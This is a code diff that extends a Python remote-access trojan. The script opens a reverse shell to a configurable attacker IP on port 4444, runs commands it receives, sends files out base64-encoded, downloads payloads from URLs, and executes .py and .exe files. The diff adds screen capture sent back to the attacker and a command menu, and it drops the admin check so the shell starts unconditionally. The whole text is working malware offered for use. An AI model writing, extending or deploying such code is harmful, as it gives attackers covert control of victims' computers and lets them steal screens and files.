@@ -6,6 +6,7 @@ import subprocess
 import os
 import base64
 import urllib.request
+from PIL import ImageGrab
 
 BUFFER_SIZE = 4096
 END_MARKER = b"<END>"
@@ -39,10 +40,10 @@ def download_file(s, file_path):
         if not os.path.exists(file_path):
             s.send(b"File not found")
             return False
-        
+
         with open(file_path, 'rb') as f:
             file_data = f.read()
-        
+
         encoded_data = base64.b64encode(file_data)
         send_all(s, encoded_data)
         return True
@@ -54,12 +55,18 @@ def download_from_url(url, save_path):
     try:
         # Create directory if it doesn't exist
         os.makedirs(os.path.dirname(save_path), exist_ok=True)
-        
+
         # Download the file
         urllib.request.urlretrieve(url, save_path)
         return True, f"File downloaded successfully to {save_path}"
     except Exception as e:
         return False, f"Download error: {str(e)}"
+
+def take_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot_path = "screenshot.png"
+    screenshot.save(screenshot_path)
+    return screenshot_path
 
 def reverse_shell(ip, port):
     try:
@@ -71,7 +78,7 @@ def reverse_shell(ip, port):
             command = s.recv(1024).decode().strip()
             if not command:
                 break
-                
+
             if command.lower() == "exit":
                 break
 
@@ -101,6 +108,31 @@ def reverse_shell(ip, port):
                     s.send(f"cd error: {e}\n".encode())
                 continue
 
+            # Handle screenshots
+            if command.startswith("screenshot"):
+                screenshot_path = take_screenshot()
+                download_file(s, screenshot_path)
+                continue
+
+            # Handle executing programs (.py and .exes for now)
+            if command.startswith("run "):
+                file_path = command[4:]
+                try:
+                    if file_path.endswith(".py"):
+                        subprocess.Popen(["python", file_path], shell=True)
+                    elif file_path.endswith(".exe"):
+                        subprocess.Popen([file_path], shell=True)
+                    else:
+                        s.send(b"Unsupported file type\n")
+                    s.send(b"File executed\n")
+                except Exception as e:
+                    s.send(f"Execution error: {e}\n".encode())
+                continue
+
+            if command.startswith("help"):
+                s.send(b"Command list:\ndownload\nuploadfromurl\nscreenshot\nrun\ncd, and other cmd commands\n")
+
+
             # Execute system command
             try:
                 process = subprocess.Popen(command, shell=True,
@@ -119,16 +151,12 @@ def reverse_shell(ip, port):
         print(f"Connection error: {e}")
 
 if __name__ == "__main__":
-    if is_admin():
-        print("Running with admin privileges")
-        
-        webbrowser.open("example.com")
-        
-        # Configure these values to the attackers stuff
-        attacker_ip = "0.0.0.0"
-        attacker_port = 4444
-        
-        reverse_shell(attacker_ip, attacker_port)
-    else:
-        print("Requesting admin privileges...")
-        run_as_admin()
+    print("Running with admin privileges")
+
+    webbrowser.open("example.com")
+
+    # Configure these values to the attackers stuff
+    attacker_ip = "0.0.0.0"
+    attacker_port = 4444
+
+    reverse_shell(attacker_ip, attacker_port)
